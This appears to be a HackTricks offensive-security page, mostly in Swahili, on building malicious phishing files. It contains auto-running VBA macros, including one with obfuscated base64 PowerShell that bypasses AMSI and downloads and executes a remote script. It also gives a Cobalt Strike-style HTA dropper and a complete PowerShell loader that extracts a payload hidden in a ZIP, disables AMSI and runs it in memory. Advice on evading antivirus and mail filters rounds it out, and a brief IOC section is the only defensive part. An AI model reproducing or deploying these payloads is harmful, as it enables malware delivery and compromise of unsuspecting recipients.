# Phishing Files & Documents

{{#include ../../banners/hacktricks-training.md}}

## Office Documents

Microsoft Word hufanya uhakiki wa data za faili kabla ya kufungua faili. Uhakiki wa data hufanywa kwa njia ya utambuzi wa muundo wa data, dhidi ya kiwango cha OfficeOpenXML. Ikiwa hitilafu yoyote itatokea wakati wa utambuzi wa muundo wa data, faili inayochunguzwa haitafunguliwa.

Kwa kawaida, faili za Word zenye macros zinatumia ugani `.docm`. Hata hivyo, inawezekana kubadilisha jina la faili kwa kubadilisha ugani wa faili na bado kuendelea kuwa na uwezo wa kutekeleza macros.\
Kwa mfano, faili ya RTF haitegemei macros, kwa muundo, lakini faili ya DOCM iliyobadilishwa jina kuwa RTF itashughulikiwa na Microsoft Word na itakuwa na uwezo wa kutekeleza macro.\
Mambo ya ndani na mifumo hiyo hiyo yanatumika kwa programu zote za Microsoft Office Suite (Excel, PowerPoint etc.).

Unaweza kutumia amri ifuatayo kuangalia ni ugani gani utakavyotekelezwa na baadhi ya programu za Office:
```bash
assoc | findstr /i "word excel powerp"
```
Fayil za DOCX zinazorejelea remote template (File –Options –Add-ins –Manage: Templates –Go) ambazo zinajumuisha macros zinaweza pia kutekeleza macros.

### Kupakia Picha za Nje

Nenda kwa: _Insert --> Quick Parts --> Field_\
_**Categories**: Links and References, **Filed names**: includePicture, and **Filename or URL**:_ http://<ip>/whatever

![](<../../images/image (155).png>)

### Macros Backdoor

Inawezekana kutumia macros kuendesha code yoyote kutoka kwenye hati.

#### Autoload functions

Kadri zinavyokuwa za kawaida zaidi, ndivyo AV inavyoweza kuzitambua.

- AutoOpen()
- Document_Open()

#### Mfano za Macros Code
```vba
Sub AutoOpen()
CreateObject("WScript.Shell").Exec ("powershell.exe -nop -Windowstyle hidden -ep bypass -enc JABhACAAPQAgACcAUwB5AHMAdABlAG0ALgBNAGEAbgBhAGcAZQBtAGUAbgB0AC4AQQB1AHQAbwBtAGEAdABpAG8AbgAuAEEAJwA7ACQAYgAgAD0AIAAnAG0AcwAnADsAJAB1ACAAPQAgACcAVQB0AGkAbABzACcACgAkAGEAcwBzAGUAbQBiAGwAeQAgAD0AIABbAFIAZQBmAF0ALgBBAHMAcwBlAG0AYgBsAHkALgBHAGUAdABUAHkAcABlACgAKAAnAHsAMAB9AHsAMQB9AGkAewAyAH0AJwAgAC0AZgAgACQAYQAsACQAYgAsACQAdQApACkAOwAKACQAZgBpAGUAbABkACAAPQAgACQAYQBzAHMAZQBtAGIAbAB5AC4ARwBlAHQARgBpAGUAbABkACgAKAAnAGEAewAwAH0AaQBJAG4AaQB0AEYAYQBpAGwAZQBkACcAIAAtAGYAIAAkAGIAKQAsACcATgBvAG4AUAB1AGIAbABpAGMALABTAHQAYQB0AGkAYwAnACkAOwAKACQAZgBpAGUAbABkAC4AUwBlAHQAVgBhAGwAdQBlACgAJABuAHUAbABsACwAJAB0AHIAdQBlACkAOwAKAEkARQBYACgATgBlAHcALQBPAGIAagBlAGMAdAAgAE4AZQB0AC4AVwBlAGIAQwBsAGkAZQBuAHQAKQAuAGQAbwB3AG4AbABvAGEAZABTAHQAcgBpAG4AZwAoACcAaAB0AHQAcAA6AC8ALwAxADkAMgAuADEANgA4AC4AMQAwAC4AMQAxAC8AaQBwAHMALgBwAHMAMQAnACkACgA=")
End Sub
```

```vba
Sub AutoOpen()

Dim Shell As Object
Set Shell = CreateObject("wscript.shell")
Shell.Run "calc"

End Sub
```

```vba
Dim author As String
author = oWB.BuiltinDocumentProperties("Author")
With objWshell1.Exec("powershell.exe -nop -Windowsstyle hidden -Command-")
.StdIn.WriteLine author
.StdIn.WriteBlackLines 1
```

```vba
Dim proc As Object
Set proc = GetObject("winmgmts:\\.\root\cimv2:Win32_Process")
proc.Create "powershell <beacon line generated>
```
#### Ondoa metadata kwa mikono

Nenda kwa **File > Info > Inspect Document > Inspect Document**, ambayo itaonyesha Document Inspector. Bonyeza **Inspect** kisha **Remove All** karibu na **Document Properties and Personal Information**.

#### Kiendelezi cha Nyaraka

Baada ya kumaliza, chagua kwenye **Save as type** dropdown, badilisha muundo kutoka **`.docx`** kwenda **Word 97-2003 `.doc`**.\
Fanya hivi kwa sababu **huwezi kuhifadhi macro's ndani ya `.docx`** na kuna **stigma** kuhusu kiendelezi cha macro-enabled **`.docm`** (mf., ikoni ya thumbnail ina `!` kubwa na baadhi ya gateway za wavuti/barua pepe huzuia kabisa). Kwa hivyo, **kiendelezi cha zamani `.doc` ndicho suluhisho bora**.

#### Malicious Macros Generators

- MacOS
- [**macphish**](https://github.com/cldrn/macphish)
- [**Mythic Macro Generator**](https://github.com/cedowens/Mythic-Macro-Generator)

## Faili za HTA

HTA ni programu ya Windows ambayo **inachanganya HTML na scripting languages (such as VBScript and JScript)**. Inaunda user interface na inatekelezwa kama programu "fully trusted", bila vikwazo vya browser's security model.

HTA inatekelezwa kwa kutumia **`mshta.exe`**, ambayo kawaida huwa **imewekwa** pamoja na **Internet Explorer**, na kufanya **`mshta` dependant on IE**. Kwa hivyo ikiwa imeondolewa, HTA hazitaweza kutekelezwa.
```html
<--! Basic HTA Execution -->
<html>
<head>
<title>Hello World</title>
</head>
<body>
<h2>Hello World</h2>
<p>This is an HTA...</p>
</body>

<script language="VBScript">
Function Pwn()
Set shell = CreateObject("wscript.Shell")
shell.run "calc"
End Function

Pwn
</script>
</html>
```

```html
<--! Cobal Strike generated HTA without shellcode -->
<script language="VBScript">
Function var_func()
var_shellcode = "<shellcode>"

Dim var_obj
Set var_obj = CreateObject("Scripting.FileSystemObject")
Dim var_stream
Dim var_tempdir
Dim var_tempexe
Dim var_basedir
Set var_tempdir = var_obj.GetSpecialFolder(2)
var_basedir = var_tempdir & "\" & var_obj.GetTempName()
var_obj.CreateFolder(var_basedir)
var_tempexe = var_basedir & "\" & "evil.exe"
Set var_stream = var_obj.CreateTextFile(var_tempexe, true , false)
For i = 1 to Len(var_shellcode) Step 2
var_stream.Write Chr(CLng("&H" & Mid(var_shellcode,i,2)))
Next
var_stream.Close
Dim var_shell
Set var_shell = CreateObject("Wscript.Shell")
var_shell.run var_tempexe, 0, true
var_obj.DeleteFile(var_tempexe)
var_obj.DeleteFolder(var_basedir)
End Function

var_func
self.close
</script>
```
## Kulazimisha Uthibitishaji wa NTLM

Kuna njia kadhaa za **kulazimisha uthibitishaji wa NTLM "kwa mbali"**, kwa mfano, unaweza kuongeza **picha zisizoonekana** kwenye barua pepe au HTML ambazo mtumiaji atazifikia (hata HTTP MitM?). Au kumtumia mwathiriwa **anwani ya faili** ambayo itasababisha **uthibitishaji** kwa tu **kufungua folda.**

**Angalia mawazo haya na mengine katika kurasa zilizo hapa chini:**


{{#ref}}
../../windows-hardening/active-directory-methodology/printers-spooler-service-abuse.md
{{#endref}}


{{#ref}}
../../windows-hardening/ntlm/places-to-steal-ntlm-creds.md
{{#endref}}

### NTLM Relay

Usisahau kwamba huwezi tu kunakili hash au authentication, bali pia **perform NTLM relay attacks**:

- [**NTLM Relay attacks**](../pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md#ntml-relay-attack)
- [**AD CS ESC8 (NTLM relay to certificates)**](../../windows-hardening/active-directory-methodology/ad-certificates/domain-escalation.md#ntlm-relay-to-ad-cs-http-endpoints-esc8)

## LNK Loaders + ZIP-Embedded Payloads (fileless chain)

Kampeni zenye ufanisi mkubwa hutuma ZIP inayojumuisha hati mbili halali za kuwadanganya (PDF/DOCX) na .lnk ya hatari. Njia ni kwamba loader halisi ya PowerShell imehifadhiwa ndani ya bytes ghafi za ZIP baada ya alama maalum, na .lnk inachonga na kuikimbiza yote katika kumbukumbu.

Mtiririko wa kawaida unaotekelezwa na .lnk PowerShell one-liner:

1) Tafuta ZIP ya asili katika njia za kawaida: Desktop, Downloads, Documents, %TEMP%, %ProgramData%, na parent wa current working directory.
2) Soma bytes za ZIP na tafuta marker iliyo hardcoded (mf., xFIQCV). Kila kitu baada ya marker ni embedded PowerShell payload.
3) Nakili ZIP hadi %ProgramData%, extract hapo, na fungua decoy .docx ili ionekane halali.
4) Bypass AMSI kwa process ya sasa: [System.Management.Automation.AmsiUtils]::amsiInitFailed = $true
5) Deobfuscate hatua inayofuata (mf., ondoa characters zote za #) na execute ndani ya kumbukumbu.

Mfano wa skeleton ya PowerShell ili kuchonga na kuendesha hatua iliyowekwa ndani:
```powershell
$marker   = [Text.Encoding]::ASCII.GetBytes('xFIQCV')
$paths    = @(
"$env:USERPROFILE\Desktop", "$env:USERPROFILE\Downloads", "$env:USERPROFILE\Documents",
"$env:TEMP", "$env:ProgramData", (Get-Location).Path, (Get-Item '..').FullName
)
$zip = Get-ChildItem -Path $paths -Filter *.zip -ErrorAction SilentlyContinue -Recurse | Sort-Object LastWriteTime -Descending | Select-Object -First 1
if(-not $zip){ return }
$bytes = [IO.File]::ReadAllBytes($zip.FullName)
$idx   = [System.MemoryExtensions]::IndexOf($bytes, $marker)
if($idx -lt 0){ return }
$stage = $bytes[($idx + $marker.Length) .. ($bytes.Length-1)]
$code  = [Text.Encoding]::UTF8.GetString($stage) -replace '#',''
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
Invoke-Expression $code
```
Notes
- Delivery often abuses reputable PaaS subdomains (e.g., *.herokuapp.com) and may gate payloads (serve benign ZIPs based on IP/UA).
- The next stage frequently decrypts base64/XOR shellcode and executes it via Reflection.Emit + VirtualAlloc to minimize disk artifacts.

Persistence used in the same chain
- COM TypeLib hijacking of the Microsoft Web Browser control so that IE/Explorer or any app embedding it re-launches the payload automatically. See details and ready-to-use commands here:

{{#ref}}
../../windows-hardening/windows-local-privilege-escalation/com-hijacking.md
{{#endref}}

Hunting/IOCs
- ZIP files containing the ASCII marker string (e.g., xFIQCV) appended to the archive data.
- .lnk that enumerates parent/user folders to locate the ZIP and opens a decoy document.
- AMSI tampering via [System.Management.Automation.AmsiUtils]::amsiInitFailed.
- Long-running business threads ending with links hosted under trusted PaaS domains.

## Faili za Windows za kuiba hash za NTLM

Angalia ukurasa kuhusu **places to steal NTLM creds**:

{{#ref}}
../../windows-hardening/ntlm/places-to-steal-ntlm-creds.md
{{#endref}}


## References

- [Check Point Research – ZipLine Campaign: A Sophisticated Phishing Attack Targeting US Companies](https://research.checkpoint.com/2025/zipline-phishing-campaign/)
- [Hijack the TypeLib – New COM persistence technique (CICADA8)](https://cicada-8.medium.com/hijack-the-typelib-new-com-persistence-technique-32ae1d284661)

{{#include ../../banners/hacktricks-training.md}}
